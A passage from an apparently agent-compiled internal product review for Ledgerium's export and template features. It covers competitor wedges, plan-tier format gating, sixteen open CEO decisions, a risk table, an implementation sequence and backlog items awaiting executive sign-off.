Bar Ledgerium must clear for production-quality PDF: (a) per-step screenshots embedded full width; (b) auto-generated TOC with page anchors; (c) cover page with company logo + SOP title + date + version; (d) footer with page numbers and document reference; (e) multi-page layout that does not split screenshots across page breaks. **No competitor demonstrably ships all 5 in a single PDF output.** Scribe and Whale are closest. Clearing all 5 simultaneously is a differentiable production bar.

### §12.4 M&A watch (Competitive §9)

**Scribe Series C, Nov 2025, $1.3B valuation, $75M raised** (lead: StepStone). Launched Scribe Optimize concurrently — LLM-driven workflow intelligence with $75M behind it. The most direct competitive threat. **Risk:** Scribe acquires Whale (template library + SOP management) → 12-18 month wedge window compresses to 6-12 months. Worth monitoring quarterly.

### §12.5 Ledgerium wedges (Competitive §8)

**Wedge 1 — Deterministic template-fill with immutable evidence chain.** No competitor can produce a DOCX or PDF where every sentence is traceable to a specific observed event with timestamp + session ID. UiPath gets closest (slot-fill from capture) but output is curated by hand. **Make this visible at the output layer:** every rendered template field cites the specific captured event that populated it (`[source: session_id, event_id, timestamp]` footnote or metadata block). Compliance + enterprise procurement differentiator. No competitor within two product cycles.

**Wedge 2 — User-template ingestion with evidence-slot binding.** UiPath has slot-fill but data is curated manually. Ledgerium offers: upload your company's SOP Word/Markdown template; Ledgerium pattern-matches your section headings against recorded events; each section auto-populated with evidence-linked content from real observed behavior. Same recording + same template = same output (deterministic). Competitors use LLM guessing (Whale) or manual curation (UiPath).

**Wedge 3 — Anti-Scribe-Optimize positioning.** Scribe Optimize is probabilistic LLM inference over aggregated screen recordings; not traceable, not auditable. Ledgerium's wedge for enterprise buyers with audit/compliance requirements: "we show you the same workflow Scribe shows, but we can prove it with a hash-linked event trail — not an LLM's interpretation of aggregated screen recordings."

---

## §13 Plan-tier gating + pricing impact (Growth §4 + §7)

**Recommended gating** (anchored to iter-066 4-tier Stripe rollout $49/$249/$799):

| Format | Free | Starter ($49) | Team ($249) | Growth ($799) | Enterprise |
|---|---|---|---|---|---|
| JSON (raw + enriched) | Yes | Yes | Yes | Yes | Yes |
| Markdown SOP + Report | No | Yes | Yes | Yes | Yes |
| Print-to-PDF (via HTML) | No | Yes | Yes | Yes | Yes |
| Native PDF | No | Yes | Yes | Yes | Yes |
| DOCX | No | No | Yes | Yes | Yes |
| SVG/PNG Map snapshot | No | Yes | Yes | Yes | Yes |
| CSV (steps) | No | Yes | Yes | Yes | Yes |
| Custom-template PDF/DOCX | No | No | No | Yes | Yes |
| Signed/hash-verified PDF bundle | No | No | No | No | Yes |
| Per-org template library (write) | No | No | No | Yes | Yes |
| Per-org template library (read) | No | No | Yes | Yes | Yes |

**No per-export quota** — format gating is the right lever; quotas create friction at the moment of value demonstration. **Per-template quota** is reasonable post-MVP if abuse patterns emerge.

**Free→Starter upgrade trigger:** any export attempt (any format) on Free tier. Copy: *"Download your SOP. Free recordings are viewable here — downloading requires Starter."* Computed-signal language per MR-008 MDR-P02 brand-voice rule.

**Team→Growth upgrade trigger:** any export on Team tier surfaces dismissible banner: *"This export used Ledgerium's default template. On Growth, your whole team's recordings render in your format automatically."* Per Growth §3 GROWTH_PLAN.md Lifecycle Trigger 3.

---

## §14 Open CEO decisions (16 enumerated)

### Tier 1 — MVP-blocking (must answer before R+1 opens)

**Q-MVP-01.** Ratify MVP scope as **ETR-P01 + P02 + P03 + P04** in 4-iteration Mode 1 series (not Mode 5 batch). Default: APPROVE.

**Q-MVP-02.** Markdown export at MVP: include SOP + Workflow Report both, or SOP only? Default: BOTH (~120 LOC combined; trivial incremental cost over SOP-only).

**Q-MVP-03.** Format-picker UX at MVP: radio list with single Download CTA (UX §2 verdict B) vs current 5-button stack? Default: radio list (replaces current stack; resolves the broken `openFullView` button in the same refactor).

**Q-MVP-04.** Pre-launch analytics baselines (Analytics §6) — instrument BEFORE R+1 ships, or accept "improvement unmeasurable from baseline" gap? Default: instrument before; ~30 LOC analytics-only iteration as R+0.

### Tier 2 — Phase 2 sequencing

**Q-P2-01.** PDF approach: ratify print-to-PDF (MVP zero-cost) AND defer native PDF (`pdf-lib`) to P2? Default: APPROVE.

**Q-D-01 (DISAGREEMENT FLAGGED).** DOCX generation: **client-side via `docx` `Packer.toBlob()`** (no server dep; ~180KB dynamic import) vs **server-side via `/api/exports/docx`** (zero extension bundle weight; requires network). System-architect recommends server; backend-engineer recommends client. Default: server-side (architect's determinism-canonical-environment argument carries more weight given Phase 3 server-side dependencies anyway).

**Q-P2-02.** Server-side Puppeteer for Enterprise signed-PDF in Phase 2 or defer to Phase 3? Default: Phase 3 (Enterprise tier ships later; not MVP-critical).

**Q-P2-03.** Per-format byte-identity invariant tests (ETR-F05) — golden-fixture count per format. Default: 5 fixtures per format (mirrors iter-051 pattern; >5 is overhead without proportional invariant strength).

### Tier 3 — Phase 3 template scope

**Q-P3-01.** Template ingestion MVP scope: DOCX only, Markdown only, or both? Default: BOTH (`mammoth` handles DOCX→HTML; MD is trivial; no incremental security surface).

**Q-P3-02.** Template upload location: extension sidepanel (new tab in `ProcessScreen`) vs web-app Settings page (`/settings/templates`)? UX-designer §4 recommends web-app Settings (sidepanel is capture surface, not config surface); architect §5 recommends 3-tier storage which implies web-app for org tier. Default: web-app Settings + per-user `chrome.storage.local` for personal templates.

**Q-P3-03.** Template-driven generation at recording-time vs export-time only? UX §4 recommends export-time-only (recording-time inverts the evidence-first model). Default: export-time only.

**Q-P3-04.** AI-assisted placeholder inference at Phase 3 entry vs Phase 4+? Per AI-VISION §11.2 sequencing, AI features queue after AI+1 provider-adapter foundation. Default: Phase 4+.

**Q-P3-05.** Template marketplace (community-shared, rated, searchable) vs private upload only at Phase 3? Growth §5 recommends private + export-template-from-recording virality mechanism only. Default: private only at P3; marketplace deferred to P4.

### Tier 4 — Pricing + plan gating

**Q-PR-01.** Ratify the §13 plan-tier gating table. Default: APPROVE as drafted.

**Q-PR-02.** Free-tier export gating: JSON-only (per dominant industry pattern) or include Markdown + print-to-PDF? Default: JSON-only (matches industry; preserves Free→Starter conversion lever).

**Q-PR-03.** Per-template quota for Phase 3: cap on Free / Starter / Team or unlimited? Growth §4 recommends post-MVP if abuse emerges. Default: defer; no quota at Phase 3 launch.

---

## §15 Strengths to preserve (don't touch in MVP)

1. **Workflow report builder determinism** (`workflow-report-builder.ts`) — pure, deterministic, byte-identical-modulo-timestamp. Extend, don't replace.
2. **HTML report print-to-PDF quality** — already production-grade per QA §1; cover page + tables + section anchors all render clean.
3. **Existing JSON export contracts** (raw + enriched) — automation users depend on these shapes; treat as frozen API.
4. **Iter-031 inline-edit + inline-archive-confirm patterns** — reuse verbatim for template management UI (§9.3 ETR-T04).
5. **Iter-038 reportStatus 3-state pattern** (`'idle' | 'loading' | 'error'` + 3s auto-reset) — reuse for all new export progress indicators.
6. **Iter-041 useEscapeDispatch** centralization — reuse for any new popovers/dropdowns/template preview modals.
7. **CSS `opacity-0 group-hover:opacity-100 focus-visible:opacity-100` pattern** (iter-034 MDR-P06 fix) — apply to icon-only export buttons per UX §7 a11y.
8. **PostHog `disable_session_recording: true` privacy posture** (iter-038) — extend to template content allow-list per Analytics §4.
9. **Capture pipeline + race-condition fixes** (iter-099) — DO NOT touch `background/index.ts` `handleStart` / `onUpdated` 100ms delays; do NOT touch `live-steps.ts` `eventById` Map. Both are now governance-protected per CLAUDE.md § Extension Reliability Invariant.

---

## §16 Risks + dependencies

### §16.1 Top 5 risks (system-architect §9)

| Rank | Risk | Likelihood | Mitigation | Address at |
|---|---|---|---|---|
| 1 | MV3 SW compatibility of binary-format libs | HIGH | Server-side DOCX from day 1 (Q-D-01 default = server) | R+5+ |
| 2 | Template injection / XSS via uploaded HTML | HIGH | Mustache-strict only; DOMPurify; CSP; Web Worker sandbox | R+10+ |
| 3 | `chrome.storage.local` 10MB ceiling on per-user templates | MED | 64KB per-template cap + 50-template count guard | R+12 |
| 4 | Determinism break via timezone-dependent date rendering in templates | MED | All template date tokens UTC-only, ISO-8601 | R+10 |
| 5 | Org-template plan-tier bypass | MED | Middleware plan check on `/api/templates` write; mirror `isAdminUnlimited` pattern | R+12 |

### §16.2 Dependencies on prior work

- **Iter-099 capture-pipeline fix** — must remain intact; no regression
- **Iter-098 Chrome Store hardening** — telemetry-removed, apiKey-local, no activeTab; preserve all
- **Iter-066 Stripe billing-stack** — plan tier gates depend on `userPlan` resolution; already in place
- **`workflow-report-builder.ts` schema** — frozen contract; extend with new placeholder fields, don't reshape
- **PolicyEngine `redact` outcome** — egress gate per Security §1 threat 3; must be honored in every new format

---

## §17 Implementation sequence (post-CEO scope-lock)

Default sequence assuming all Tier-1 defaults approved:

| Iter | Item | Mode | Counts toward cadence? |
|---|---|---|---|
| (this artifact) | EXPORT_TEMPLATE_REVIEW_001 | Mode 3-adjacent | NO (non-counting) |
| R+0 | Pre-launch analytics baselines + new event taxonomy | Mode 2 directed | YES |
| R+1 | **ETR-P01** Fix broken `openFullView` | Mode 1 burn-down | YES |
| R+2 | **ETR-P02** SOP-view inline export | Mode 1 burn-down | YES |
| R+3 | **ETR-P03** Map-view export + SVG | Mode 1 burn-down | YES |
| R+4 | **ETR-P04** Markdown export + format picker refactor | Mode 1 burn-down | YES |
| (post-MVP) | Meta-review forced — MR-005 D-7 N≥4 base cadence | Mode 4 | NO |
| R+5+ | Phase 2 items per §9.2 (5 iterations) | Mode 1 series | YES |
| (post-P2) | Meta-review + Phase 3 entry gate + security checklist | Mode 4 | NO |
| R+10+ | Phase 3 items per §9.3 (7 iterations) | Mode 1 series | YES |

**Mode 5 explicitly rejected** for all phases. Rationale: each export surface ships independently with no cross-cutting architectural-decision family; Mode 1 series preserves bounded-loop discipline and avoids MR-005 D-7 N≥6 pre-check overhead.

---

## §18 Backlog promotion candidates (MR-005 D-5 audit-intake)

### §18.1 P0 — LIVE promotion at this intake

Per MR-005 D-5 protocol, the following 4 P0 items promote to `IMPROVEMENT_BACKLOG.md` with `Birth iter: audit-intake-ETR-001`:

| Row | ID | Title | Score (I+A+L+C−E−R) | Primary | Notes |
|---|---|---|---|---|---|
| TBD | **ETR-P01** | Fix broken Open Full Workflow Map button | 4+5+2+5−1−1=14 | `frontend-engineer` | Smallest possible surface; clears P0 with maximum credibility |
| TBD | **ETR-P02** | SOP-view inline export affordance + route to Export tab | 4+5+3+4−2−1=13 | `frontend-engineer` | D-4 clause 1 likely (≥3 user-visible copy strings) |
| TBD | **ETR-P03** | Map-view export + SVG generation via `html-to-image` | 4+5+3+4−2−2=12 | `frontend-engineer` | New dep ~15KB dynamic |
| TBD | **ETR-P04** | Markdown export (SOP + Report) + format-picker refactor | 4+5+4+4−3−2=12 | `backend-engineer` | D-4 clause 2 candidate (~200 LOC pure module surface) |

### §18.2 P1/P2/P3 — COLD pool (held in this artifact)

Per MR-005 D-5 clauses 4-5, the following items are held cold; promotion path = (a) P0 burn-down creating a slot OR (b) PRD-trigger enumerated dependency:

**Phase 2 (P1 cold):**
- **ETR-F01** Native PDF via `pdf-lib`
- **ETR-F02** DOCX (path A or B per Q-D-01)
- **ETR-F03** CSV steps export
- **ETR-F04** PNG Map snapshot
- **ETR-F05** Per-format byte-identity invariant tests

**Phase 3 (P2 cold) — TEMPLATE INGESTION UMBRELLA:**

Per MR-016 §STRUCTURAL umbrella-split discipline + MR-018 multi-iteration umbrella criteria, the template ingestion feature **MUST be split at intake** into N independent rows (each producing independent numerator credit when shipped):

- **ETR-T01** Template schema + Zod validators
- **ETR-T02** Template upload pipeline + mammoth
- **ETR-T03** Template storage tier (chrome.storage + Prisma model)
- **ETR-T04** Template management UI
- **ETR-T05** Template-driven rendering (logic-less merge)
- **ETR-T06** Web Worker sandbox for render
- **ETR-T07** Security checklist gate

**Phase 4 (P3 cold) — DEFERRED:**
- **ETR-W01** Workflow template schema (§7.2 structural-assertion variant)
- **ETR-W02** Workflow conformance reporting
- **ETR-C01** Confluence direct-push integration (`/api/integrations/confluence`)
- **ETR-AI01** AI-assisted placeholder inference (gated by AI-VISION AI+1)
- **ETR-MK01** Template marketplace (community-shared, rated, searchable)

### §18.3 Cold-pool staleness check

Per MR-006 Change D, all cold-pool items here carry `Birth iter: audit-intake-ETR-001`; mandatory triage at age 10 (i.e., iter ~R+10 if MVP starts at R+1 — coincides with proposed Phase 3 entry meta-review).

---

## §19 Coordinator notes — governance hygiene

**Cool-off recharge counter:** UNCHANGED at 3/3 FULL RE-ARM (Mode 3-adjacent non-counting per established convention since MR-006 Change A; preserved across this event).

**D-1 reverse-portfolio-drift counter:** UNCHANGED at 3 (Mode 3-adjacent does not advance 5-iter counting window).

**Area saturation clock:** NOT advanced (Mode 3-adjacent per MDR / WDC / PIB / AI-VISION precedent).

**Meta-review cadence counter:** UNCHANGED at 0/3 (Mode 3-adjacent non-counting; earliest next meta-review per established 3-loop floor after MVP completes).

**Cold-pool ages (other reviews):** Existing DV2 / MDR / WDC / PIB / WDC-002 cold-pools unaffected by this intake. Their staleness counters advance only on counted iterations.

**21 candidate cold-pool items NOT held in conventional cold pool:** all rows in this artifact's §18.2 are held in THIS artifact's cold pool per MR-005 D-5; coordinator-distinct from other review cold pools.

**MR-013 Diff #2 source-artifact verification:** N/A at intake — verification fires at backlog-row endorsement time, not at intake. Will fire at iter R+1 endorsement.

**Zero CLAUDE.md governance diffs at EXPORT_TEMPLATE_REVIEW_001 close** — preserves the stability-default posture established at MR-018 and the Extension Reliability Invariant added 2026-05-28.

---

## §20 Appendices

### §20.1 Appendix A — Agent output map

| Agent | Section in artifact | Word count contribution |
|---|---|---|
| product-manager | §1, §4, §5, §14 Tier 1-2, §7 (MVP acceptance), §15 | ~900 words |
| ux-designer | §1, §6, §8, §17 (UX subset of §3), §15 | ~800 words |
| system-architect | §3, §7, §8, §16, §17 | ~900 words |
| backend-engineer | §6, §8, §9, §10 (bundle budgets) | ~700 words |
| frontend-engineer | §9 (UI subset), §15 (preserve patterns), §17 | ~700 words |
| qa-engineer | §5 (MVP acceptance), §10 (test matrix), §16 | ~700 words |
| growth-strategist | §1 (moat), §4, §13, §14 Tier 4, §17 | ~600 words |
| competitive-researcher | §12 (entire) | ~800 words |
| analytics | §11 (entire) | ~500 words |
| general-purpose (security) | §10 (entire) | ~600 words |
| **Cumulative input** | — | **~7,200 words** |
| **Consolidated output** | this artifact | **~6,800 words** |

### §20.2 Appendix B — Dependencies to add (backend-engineer §9)

All dynamic-import-only — zero static bundle impact:

| Package | Version | Gzipped | Purpose | First iteration |
|---|---|---|---|---|
| `pdf-lib` | `^1.17.1` | ~180KB | Native PDF generation | R+5 |
| `docx` | `^9.1.1` | ~180KB | DOCX generation via `Packer.toBlob()` (if Q-D-01=A) | R+6 |
| `html-to-image` | `^1.11.11` | ~15KB | SVG/PNG capture of ReactFlow map DOM | R+3 |
| `mammoth` | `^1.8.0` | ~250KB | DOCX template ingestion → HTML → placeholder extraction | R+11 |
| `dompurify` | `^3.0.x` | ~30KB | XSS/SVG sanitization (Security §1, §2) | R+10 |

### §20.3 Appendix C — Open question summary table

| ID | Question | Default | Tier |
|---|---|---|---|
| Q-MVP-01 | Ratify MVP scope (ETR-P01-P04 Mode 1 series) | APPROVE | 1 |
| Q-MVP-02 | Markdown MVP scope (SOP+Report or SOP only) | BOTH | 1 |
| Q-MVP-03 | Format-picker UX (radio-list vs button stack) | RADIO-LIST | 1 |
| Q-MVP-04 | Pre-launch analytics baselines as R+0? | INSTRUMENT FIRST | 1 |
| Q-P2-01 | Defer native PDF to Phase 2 | APPROVE | 2 |
| Q-D-01 | DOCX client-side vs server-side | SERVER-SIDE (architect over backend) | 2 |
| Q-P2-02 | Enterprise signed-PDF at P2 or P3 | P3 | 2 |
| Q-P2-03 | Byte-identity golden fixtures per format | 5 | 2 |
| Q-P3-01 | Template MVP: DOCX, MD, or both | BOTH | 3 |
| Q-P3-02 | Template upload location | WEB-APP SETTINGS + chrome.storage.local | 3 |
| Q-P3-03 | Template-driven gen: record-time vs export-time | EXPORT-TIME ONLY | 3 |
| Q-P3-04 | AI placeholder inference at P3 or P4+ | P4+ | 3 |
| Q-P3-05 | Template marketplace at P3 | DEFER TO P4 | 3 |
| Q-PR-01 | Ratify §13 plan-tier gating table | APPROVE | 4 |
| Q-PR-02 | Free-tier export: JSON-only or include MD/print-PDF | JSON-ONLY | 4 |
| Q-PR-03 | Per-template quota at P3 launch | NO QUOTA | 4 |

---

**End of EXPORT_TEMPLATE_REVIEW_001. ~6,800 words. 10 specialist agents. 4 P0 promotions. 21 P1/P2/P3 cold items. 16 open CEO decisions. Zero product code touched. Zero CLAUDE.md governance diffs.**

**Awaiting CEO scope-lock on Tier-1 decisions (Q-MVP-01 through Q-MVP-04) before iter R+0 / R+1 commences.**
